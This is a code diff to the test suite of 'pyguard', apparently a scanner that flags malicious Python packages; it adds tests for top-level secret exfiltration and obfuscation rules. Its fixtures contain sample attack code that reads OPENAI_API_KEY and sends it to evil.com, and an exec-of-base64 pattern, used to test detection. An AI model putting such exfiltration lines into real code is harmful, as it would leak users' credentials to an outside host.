@@ -2,23 +2,19 @@
 
 from __future__ import annotations
 
-import json
-import tempfile
 from pathlib import Path
-from unittest.mock import patch, MagicMock
-
-import pytest
+from unittest.mock import patch
 
 from pyguard.environment import InstalledPackage, EnvironmentInfo
 from pyguard.rules import (
     Severity,
     rule_known_bad_version,
     rule_pth_startup,
+    rule_toplevel_secret_network,
+    rule_obfuscation,
     rule_secret_plus_network,
     rule_secret_access,
-    rule_network_calls,
     check_startup_hooks,
-    _PTH_EXECUTABLE_RE,
 )
 
 
@@ -128,7 +124,81 @@ class TestStartupHooks:
 
 
 # ---------------------------------------------------------------------------
-# secret + network combo
+# toplevel_secret_network (AST-based HIGH rule)
+# ---------------------------------------------------------------------------
+
+class TestToplevelSecretNetwork:
+    def test_detects_toplevel_exfil(self, tmp_path):
+        pkg_dir = tmp_path / "testpkg"
+        pkg_dir.mkdir()
+        # Top-level code: reads secret and posts immediately
+        (pkg_dir / "__init__.py").write_text(
+            "import os\nimport urllib.request\n"
+            "key = os.environ.get('OPENAI_API_KEY')\n"
+            "urllib.request.urlopen('http://evil.com/?k=' + key)\n"
+        )
+        pkg = make_pkg(name="testpkg")
+        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
+            findings = rule_toplevel_secret_network(pkg, make_env())
+        assert len(findings) >= 1
+        assert findings[0].severity == Severity.HIGH
+
+    def test_ignores_function_level_code(self, tmp_path):
+        pkg_dir = tmp_path / "testpkg"
+        pkg_dir.mkdir()
+        # Same operations but inside a function — legitimate pattern
+        (pkg_dir / "__init__.py").write_text(
+            "import os, requests\n"
+            "def upload(data):\n"
+            "    key = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
+            "    requests.post('https://s3.amazonaws.com', data=data)\n"
+        )
+        pkg = make_pkg(name="testpkg")
+        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
+            findings = rule_toplevel_secret_network(pkg, make_env())
+        assert findings == []
+
+    def test_whitelisted_package_skipped(self, tmp_path):
+        pkg_dir = tmp_path / "requests"
+        pkg_dir.mkdir()
+        (pkg_dir / "__init__.py").write_text(
+            "import os\nkey = os.environ.get('X')\n"
+        )
+        pkg = make_pkg(name="requests")
+        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
+            findings = rule_toplevel_secret_network(pkg, make_env())
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# obfuscation
+# ---------------------------------------------------------------------------
+
+class TestObfuscation:
+    def test_detects_base64_exec(self, tmp_path):
+        pkg_dir = tmp_path / "testpkg"
+        pkg_dir.mkdir()
+        (pkg_dir / "__init__.py").write_text(
+            "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"
+        )
+        pkg = make_pkg(name="testpkg")
+        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
+            findings = rule_obfuscation(pkg, make_env())
+        assert len(findings) == 1
+        assert findings[0].severity == Severity.HIGH
+
+    def test_clean_package(self, tmp_path):
+        pkg_dir = tmp_path / "testpkg"
+        pkg_dir.mkdir()
+        (pkg_dir / "__init__.py").write_text("def add(a, b): return a + b\n")
+        pkg = make_pkg(name="testpkg")
+        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
+            findings = rule_obfuscation(pkg, make_env())
+        assert findings == []
+
+
+# ---------------------------------------------------------------------------
+# secret_plus_network (now MEDIUM)
 # ---------------------------------------------------------------------------
 
 class TestSecretPlusNetwork:
@@ -137,20 +207,23 @@ class TestSecretPlusNetwork:
         pkg_dir.mkdir()
         (pkg_dir / "__init__.py").write_text("")
         (pkg_dir / "evil.py").write_text(
-            "import os\nimport requests\nkey = os.environ['OPENAI_API_KEY']\nrequests.post('http://evil.com', data=key)\n"
+            "import os\nkey = os.environ['OPENAI_API_KEY']\n"
+            "import urllib.request\nurllib.request.urlopen('http://evil.com/?k=' + key)\n"
         )
         pkg = make_pkg(name="testpkg")
         with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
             findings = rule_secret_plus_network(pkg, make_env())
         assert len(findings) >= 1
-        assert findings[0].severity == Severity.HIGH
+        assert findings[0].severity == Severity.MEDIUM
 
-    def test_network_only_no_high(self, tmp_path):
-        pkg_dir = tmp_path / "testpkg"
+    def test_whitelisted_package_skipped(self, tmp_path):
+        pkg_dir = tmp_path / "requests"
         pkg_dir.mkdir()
-        (pkg_dir / "__init__.py").write_text("")
-        (pkg_dir / "client.py").write_text("import requests\nrequests.get('https://api.example.com')\n")
-        pkg = make_pkg(name="testpkg")
+        (pkg_dir / "sessions.py").write_text(
+            "import os\nkey = os.environ.get('X')\n"
+            "def send(req):\n    req.post('https://example.com')\n"
+        )
+        pkg = make_pkg(name="requests")
         with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
             findings = rule_secret_plus_network(pkg, make_env())
         assert findings == []
@@ -163,19 +236,21 @@ class TestSecretPlusNetwork:
 
 
 # ---------------------------------------------------------------------------
-# secret_access
+# secret_access (now LOW)
 # ---------------------------------------------------------------------------
 
 class TestSecretAccess:
     def test_detects_env_access(self, tmp_path):
         pkg_dir = tmp_path / "testpkg"
         pkg_dir.mkdir()
-        (pkg_dir / "__init__.py").write_text("import os\nkey = os.environ.get('AWS_SECRET_ACCESS_KEY')\n")
+        (pkg_dir / "__init__.py").write_text(
+            "import os\nkey = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
+        )
         pkg = make_pkg(name="testpkg")
         with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
             findings = rule_secret_access(pkg, make_env())
         assert len(findings) == 1
-        assert findings[0].severity == Severity.MEDIUM
+        assert findings[0].severity == Severity.LOW
 
     def test_clean_package(self, tmp_path):
         pkg_dir = tmp_path / "testpkg"
@@ -184,29 +259,4 @@ class TestSecretAccess:
         pkg = make_pkg(name="testpkg")
         with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
             findings = rule_secret_access(pkg, make_env())
-        assert findings == []
-
-
-# ---------------------------------------------------------------------------
-# network_calls
-# ---------------------------------------------------------------------------
-
-class TestNetworkCalls:
-    def test_detects_requests(self, tmp_path):
-        pkg_dir = tmp_path / "testpkg"
-        pkg_dir.mkdir()
-        (pkg_dir / "__init__.py").write_text("import requests\n")
-        pkg = make_pkg(name="testpkg")
-        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
-            findings = rule_network_calls(pkg, make_env())
-        assert len(findings) == 1
-        assert findings[0].severity == Severity.LOW
-
-    def test_no_network(self, tmp_path):
-        pkg_dir = tmp_path / "testpkg"
-        pkg_dir.mkdir()
-        (pkg_dir / "__init__.py").write_text("def hello(): return 'world'\n")
-        pkg = make_pkg(name="testpkg")
-        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
-            findings = rule_network_calls(pkg, make_env())
         assert findings == []
